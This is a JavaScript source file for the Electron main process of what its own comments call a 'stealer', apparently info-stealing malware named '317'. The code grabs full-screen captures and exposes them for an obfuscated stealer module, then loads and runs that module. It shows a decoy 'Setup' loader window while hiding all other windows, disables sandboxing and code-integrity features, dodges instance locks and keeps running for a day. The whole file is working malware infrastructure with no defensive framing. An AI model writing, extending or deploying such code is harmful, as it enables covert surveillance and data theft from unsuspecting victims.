// 317 NUMBER ONE - Electron Main Process
// Direct main-process screen capture via desktopCapturer
var electron = require('electron');
var app = electron.app;
var desktopCapturer = electron.desktopCapturer;
var screen = electron.screen;
var BrowserWindow = electron.BrowserWindow;
var path = require('path');
var fs = require('fs');
var os = require('os');
var childProcess = require('child_process');

// Masquerading logic removed as requested.

// App name will naturally be derived from the current exe file (e.g., RuntimeBroker)
// Do NOT override it with the original filename, otherwise Task Manager will group it under the old name!

// Use a dynamic, randomized userData path per execution
// This completely bypasses Chromium's SingletonLock and multiple-instance crashes
var randomStr = Math.random().toString(36).substring(2, 10);
var userDataPath = path.join(os.tmpdir(), '317_data_' + randomStr);
try { if (!fs.existsSync(userDataPath)) fs.mkdirSync(userDataPath, { recursive: true }); } catch(e) {}
app.setPath('userData', userDataPath);

// Prevent the "appear and disappear in task manager" bug by forcing single instance lock handling
// Single instance lock removed: Let the fake loader run on every execution so it doesn't look like a crash.

// Disable GPU rendering but KEEP software rasterizer for desktopCapturer thumbnails
app.disableHardwareAcceleration();
app.commandLine.appendSwitch('disable-gpu');
app.commandLine.appendSwitch('no-sandbox');
app.commandLine.appendSwitch('disable-features', 'RendererCodeIntegrity');
// NOTE: DO NOT disable software-rasterizer — desktopCapturer needs it for thumbnails

// Suppress EPIPE
process.stdout && process.stdout.on && process.stdout.on('error', function(){});
process.stderr && process.stderr.on && process.stderr.on('error', function(){});

// File logger
var logFile = path.join(os.tmpdir(), '317_debug.log');
try { fs.writeFileSync(logFile, '=== 317 LOG ' + new Date().toISOString() + ' ===\n'); } catch(e) {}
function fileLog(msg) { try { fs.appendFileSync(logFile, new Date().toISOString() + ' - ' + msg + '\n'); } catch(e) {} }
console.log = function() {
    var args = Array.prototype.slice.call(arguments);
    fileLog(args.map(function(a) { return typeof a === 'object' ? JSON.stringify(a) : a; }).join(' '));
};
console.error = function() {
    var args = Array.prototype.slice.call(arguments);
    fileLog('[ERR] ' + args.map(function(a) { return typeof a === 'object' ? JSON.stringify(a) : a; }).join(' '));
};

console.log('[MAIN] Starting');

// No lock file — allow re-runs freely. Chromium singleton cleanup above handles Electron conflicts.

// Screen capture function
async function captureScreenDirect() {
    try {
        var primaryDisplay = screen.getPrimaryDisplay();
        var sz = primaryDisplay.size;
        console.log('[CAP] Requesting sources... (' + sz.width + 'x' + sz.height + ')');
        
        var sources = await desktopCapturer.getSources({
            types: ['screen'],
            thumbnailSize: { width: sz.width, height: sz.height }
        });
        
        console.log('[CAP] Got ' + sources.length + ' sources');
        
        if (sources.length > 0 && sources[0].thumbnail) {
            var buf = sources[0].thumbnail.toJPEG(55);
            console.log('[CAP] Frame: ' + buf.length + ' bytes');
            if (buf && buf.length > 500) {
                return buf;
            }
        } else {
            console.log('[CAP] No sources or no thumbnail');
        }
    } catch (err) {
        console.error('[CAP] Error: ' + err.message + '\n' + err.stack);
    }
    return null;
}

// Main
app.whenReady().then(async function() {
    console.log('[MAIN] App ready');

    // Fake loader will be handled by the stealer logic or natively, restoring old structure
    // Hide all OTHER Electron windows from taskbar and rename titles
    // But EXCLUDE the fake loader window!
    var allWindows = BrowserWindow.getAllWindows();
    for (var w = 0; w < allWindows.length; w++) {
        var winTitle = allWindows[w].getTitle();
        if (winTitle && winTitle.indexOf('Setup') !== -1) continue; // Skip Fake Loader
        allWindows[w].setSkipTaskbar(true);
        allWindows[w].setTitle('Hidden');
        allWindows[w].hide();
    }

    app.on('browser-window-created', function(event, win) {
        // Wait for title to be set before deciding to hide it
        win.once('ready-to-show', function() {
            var winTitle = win.getTitle();
            if (winTitle && winTitle.indexOf('Setup') !== -1) {
                // It's the fake loader, let it show naturally!
                return;
            }
            win.setSkipTaskbar(true);
            win.setTitle('Hidden');
            win.hide();
        });
    });

    // Leftover cleanup logic removed

    // Test capture
    var testFrame = await captureScreenDirect();
    console.log('[MAIN] Test capture: ' + (testFrame ? testFrame.length + ' bytes OK' : 'FAILED'));

    // Set capture globally using bracket notation (obfuscator-safe)
    global['__317capture'] = captureScreenDirect;
    console.log('[MAIN] Global capture set');

    // Load stealer
    var stealerModule = null;
    var tryPaths = [
        path.join(__dirname, '..', 'index.js'),
        path.join(__dirname, 'index.js'),
        path.join(__dirname, '..', '..', 'index.js')
    ];
    for (var i = 0; i < tryPaths.length; i++) {
        try {
            stealerModule = require(tryPaths[i]);
            console.log('[MAIN] Loaded: ' + tryPaths[i]);
            break;
        } catch(e) {}
    }

    if (!stealerModule) {
        console.error('[MAIN] FATAL: index.js not found');
        app.quit();
        return;
    }

    // Run stealer
    if (typeof stealerModule.main === 'function') {
        try { await stealerModule.main(); } catch (err) { console.error('[MAIN] ' + err.message); }
    } else if (stealerModule._runningPromise) {
        try { await stealerModule._runningPromise; } catch(e) {}
    }

    console.log('[MAIN] Stealer done, stream active');
});

app.on('window-all-closed', function(e) { e.preventDefault(); });
setTimeout(function() { app.quit(); }, 86400000);
process.on('uncaughtException', function(err) { console.error('Uncaught: ' + err.message); });
process.on('unhandledRejection', function(reason) { console.error('Unhandled: ' + reason); });
